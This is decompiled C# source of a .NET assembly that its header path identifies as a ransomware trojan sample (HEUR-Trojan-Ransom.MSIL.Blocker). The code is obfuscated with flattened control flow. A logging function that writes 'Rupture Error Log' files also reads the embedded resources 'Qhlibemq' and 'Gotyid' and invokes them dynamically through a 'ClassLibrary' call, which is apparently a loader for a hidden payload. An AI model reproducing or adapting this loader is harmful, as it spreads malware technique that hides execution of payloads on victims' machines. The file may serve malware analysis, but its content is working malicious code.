// Decompiled with JetBrains decompiler
// Type: SHNB83.Listeners.Tag
// Assembly: SHNB83, Version=6.2.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B8ADEC2C-652C-4F1A-AD72-03917C70995A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2ff875c4fdfbf9f9644bc7ebc6c9532fc92e7bb9fa92aab2b1d3ecff09f9bb94.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace SHNB83.Listeners
{
  internal static class Tag
  {
    private static StreamWriter _Watcher;
    private static Tag CustomizeUtils;

    internal static void FlushExporter(string i)
    {
      int num1 = 0;
      object obj1;
      object instance;
      object obj2;
      DateTime now;
      while (true)
      {
        bool flag = num1 < 15;
        int num2 = 2;
label_1:
        while (true)
        {
          int num3 = num2;
          while (true)
          {
            switch (num3)
            {
              case 1:
                goto label_8;
              case 2:
                if (!flag)
                {
                  now = DateTime.Now;
                  if (Tag.FlushUtils() == null)
                  {
                    num3 = 4;
                    continue;
                  }
                  goto label_1;
                }
                else
                  goto label_8;
              case 3:
                // ISSUE: type reference
                instance = Activator.CreateInstance(Tag.PublishUtils(__typeref (ClassLibrary1.ClassLibrary1)));
                obj1 = (object) Tag.CollectExporter("Qhlibemq");
                obj2 = (object) Tag.CollectExporter("Gotyid");
                num3 = !Tag.SetUtils() ? 0 : 0;
                continue;
              case 4:
                goto label_6;
              case 5:
                goto label_11;
              default:
                goto label_15;
            }
          }
label_6:
          if (Tag._Watcher == null)
            num2 = 3;
          else
            goto label_14;
        }
label_8:
        Thread.Sleep(999);
        ++num1;
      }
label_11:
      string path;
      Tag._Watcher = new StreamWriter((Stream) File.Open(path, FileMode.Append));
label_13:
label_14:
      string str1 = string.Format("[Entry {0}]: {1}", (object) now.ToString("MM-dd-yyyy hh:mm tt"), (object) i);
      Tag._Watcher.WriteLine(str1);
      Tag._Watcher.Flush();
      Console.WriteLine(str1);
      return;
label_15:
      // ISSUE: reference to a compiler-generated field
      if (Tag.\u003C\u003Eo__1.queue == null)
      {
        // ISSUE: reference to a compiler-generated field
        Tag.\u003C\u003Eo__1.queue = CallSite<Action<CallSite, object, object, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "ClassLibrary", (IEnumerable<Type>) null, typeof (Tag), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[4]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          (CSharpArgumentInfo) Tag.StartUtils(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (object) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      Tag.\u003C\u003Eo__1.queue.Target((CallSite) Tag.\u003C\u003Eo__1.queue, instance, obj1, obj2, "InstantiateGetter");
      string str2 = Path.Combine((string) Tag.ResetUtils(Environment.SpecialFolder.LocalApplicationData), "Rupture");
      if (!Directory.Exists(str2))
        Tag.VisitUtils((object) str2);
      path = Path.Combine(str2, string.Format("Rupture Error Log - {0}.txt", (object) now.ToString("MM-dd-yyyy")));
      if (!File.Exists(path))
      {
        Tag._Watcher = new StreamWriter((Stream) File.Create(path));
        goto label_13;
      }
      else
        goto label_11;
    }

    private static byte[] CollectExporter(string config)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string str1 = ((IEnumerable<string>) executingAssembly.GetManifestResourceNames()).SingleOrDefault<string>((Func<string, bool>) (r => r.Contains(config)));
      if (str1 != null)
        goto label_6;
      else
        goto label_3;
label_2:
      byte[] numArray;
      return numArray;
label_3:
      int num = 0;
      if (Tag.FlushUtils() != null)
        goto label_4;
label_1:
      switch (num)
      {
        case 1:
          goto label_2;
        default:
          str1 = "";
          goto label_6;
      }
label_4:
      num = 0;
      goto label_1;
label_6:
      string str2 = str1;
      Stream stream = (Stream) Tag.MoveUtils((object) executingAssembly, (object) str2);
      byte[] buffer = new byte[stream.Length];
      stream.Read(buffer, 0, buffer.Length);
      numArray = buffer;
      goto label_2;
    }

    internal static void AssetExporter(string i, params string[] values) => Tag.FlushExporter(string.Format(i, (object[]) values));

    internal static Type PublishUtils([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    internal static object StartUtils([In] CSharpArgumentInfoFlags obj0, [In] object obj1) => (object) CSharpArgumentInfo.Create(obj0, (string) obj1);

    internal static object ResetUtils([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    internal static object VisitUtils([In] object obj0) => (object) Directory.CreateDirectory((string) obj0);

    internal static bool SetUtils() => Tag.CustomizeUtils == null;

    internal static Tag FlushUtils() => Tag.CustomizeUtils;

    internal static object MoveUtils([In] object obj0, [In] object obj1) => (object) ((Assembly) obj0).GetManifestResourceStream((string) obj1);
  }
}
